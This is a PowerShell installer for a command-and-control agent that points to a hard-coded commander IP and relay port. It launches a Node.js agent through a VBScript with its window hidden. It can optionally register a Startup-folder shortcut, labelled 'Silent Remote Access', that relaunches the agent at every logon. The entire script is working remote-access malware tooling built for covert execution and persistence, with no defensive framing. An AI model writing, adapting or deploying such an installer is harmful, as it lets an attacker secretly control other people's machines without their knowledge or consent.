param(
    [string]$CommanderIP = "100.104.20.122",
    [int]$RelayPort = 15000,
    [switch]$RegisterStartup
)

$ErrorActionPreference = "Stop"
$C2Dir = "$env:USERPROFILE\.chatbox-c2"
$SourceDir = Split-Path -Parent $MyInvocation.MyCommand.Path

Write-Host "[C2 Agent Installer]" -ForegroundColor Cyan
Write-Host "Commander IP: $CommanderIP`:$RelayPort" -ForegroundColor Yellow

# Create data directory
New-Item -ItemType Directory -Path $C2Dir -Force | Out-Null

# Generate machine ID
$idPath = "$C2Dir\machine-id"
if (-not (Test-Path $idPath)) {
    $id = -join ((48..57) + (97..102) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
    Set-Content -Path $idPath -Value $id -NoNewline
}

# Write agent config override
@"
RELAY_IP=$CommanderIP
RELAY_PORT=$RelayPort
"@ | Set-Content -Path "$C2Dir\agent-config.ini"

# Ensure node exists
$nodePath = (Get-Command node -ErrorAction SilentlyContinue).Source
if (-not $nodePath) {
    Write-Host "[!] Node.js not found. Please install Node.js first." -ForegroundColor Red
    exit 1
}
Write-Host "Node.js: $nodePath" -ForegroundColor Green

# Create silent run script
@"
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
NodePath = "$($nodePath -replace '\\', '\\')"
AgentScript = FSO.BuildPath("$($SourceDir -replace '\\', '\\')", "agent-standalone.js")
WshShell.Run Chr(34) & NodePath & Chr(34) & Chr(32) & Chr(34) & AgentScript & Chr(34), 0, False
"@ | Set-Content -Path "$C2Dir\run-agent.vbs"

Write-Host "[+] Agent files ready at: $SourceDir" -ForegroundColor Green

# Register Windows startup (optional)
if ($RegisterStartup) {
    $lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\C2-Agent.lnk"
    $wshell = New-Object -ComObject WScript.Shell
    $shortcut = $wshell.CreateShortcut($lnkPath)
    $shortcut.TargetPath = "$env:windir\system32\wscript.exe"
    $shortcut.Arguments = "`"$C2Dir\run-agent.vbs`""
    $shortcut.WindowStyle = 7  ' Hidden
    $shortcut.Description = "C2 Agent - Silent Remote Access"
    $shortcut.Save()
    Write-Host "[+] Startup registered: $lnkPath" -ForegroundColor Green
}

# Launch agent silently
Write-Host "[+] Launching agent..." -ForegroundColor Green
Start-Process wscript.exe -ArgumentList "`"$C2Dir\run-agent.vbs`"" -WindowStyle Hidden

Write-Host "[+] Agent deployed successfully!" -ForegroundColor Cyan
Write-Host "    Commander: $CommanderIP`:$RelayPort" -ForegroundColor Gray
Write-Host "    Machine ID: $(Get-Content $idPath)" -ForegroundColor Gray
